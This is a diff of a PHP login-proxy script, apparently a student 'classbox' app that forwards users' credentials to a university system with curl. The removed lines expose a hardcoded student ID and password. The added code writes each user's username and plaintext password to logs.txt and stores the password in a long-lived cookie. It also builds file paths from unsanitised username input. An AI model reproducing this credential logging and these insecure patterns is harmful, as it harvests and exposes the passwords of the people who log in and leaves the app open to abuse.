@@ -1,12 +1,12 @@
 <?php
 	include_once('config.php');
-	if(true){ //"201400301203" && "960105"
-		$data = "j_username=".trim("201400301203")."&j_password="."960105";
+	if($_POST['username'] && $_POST['password']){ //
+		$data = "j_username=".trim($_POST['username'])."&j_password=".$_POST['password'];
 		/*设置请求的 url*/
 		$log_url = BASEURL."/b/ajaxLogin";
 		
 		/*设置 用户 的log信息*/
-		$log_path = ROOT."201400301203".".txt";
+		$log_path = ROOT.$_POST['username'].".txt";
 		/*初始化  curl*/
 		$log = curl_init();
 		curl_setopt($log,CURLOPT_URL,$log_url);//设置 请求 url
@@ -20,7 +20,7 @@
 		if(file_exists($log_path)){
 			 curl_setopt ($log, CURLOPT_COOKIEJAR , $log_path); // 存放Cookie信息的文件名称  
 		}else{
-			if(strlen("201400301203") == 12){
+			if(strlen($_POST['username']) == 12){
 				$my = fopen($log_path,'rw');
 				fwrite($my,"zhaoshuai de classbox");
 				curl_setopt ($log, CURLOPT_COOKIEJAR , $log_path); // 存放Cookie信息的文件名称
@@ -37,17 +37,17 @@
 
 		if($return == "\"success\""){
 			if(file_exists($log_path)){
-				setcookie('user',"201400301203",time()+3600000,'/');//设置 cookie 下面会用到
-				setcookie('pass',"960105",time()+3600000,'/');
+				setcookie('user',$_POST['username'],time()+3600000,'/');//设置 cookie 下面会用到
+				setcookie('pass',$_POST['password'],time()+3600000,'/');
 
 				/*保存密码*/
-				$str = "username="."201400301203"."\t"."password="."960105"."\t".date("Y-m-d h:i:sa")."\n";
+				$str = "username=".$_POST['username']."\t"."password=".$_POST['password']."\t".date("Y-m-d h:i:sa")."\n";
 				$myfile = fopen(ROOT."logs.txt","a");
 				fputs($myfile,$str);
 				fclose($myfile);
                 /*获取  名字cookie*/
                 $main_url = BASEURL."/b/grxx/xs/xjxx/detail";
-                $log_path = ROOT."201400301203".".txt";
+                $log_path = ROOT.$_POST['username'].".txt";
                 $main = curl_init();
                 curl_setopt($main,CURLOPT_URL,$main_url);
                 curl_setopt($main,CURLOPT_REFERER,"http://202.194.15.33:21043");
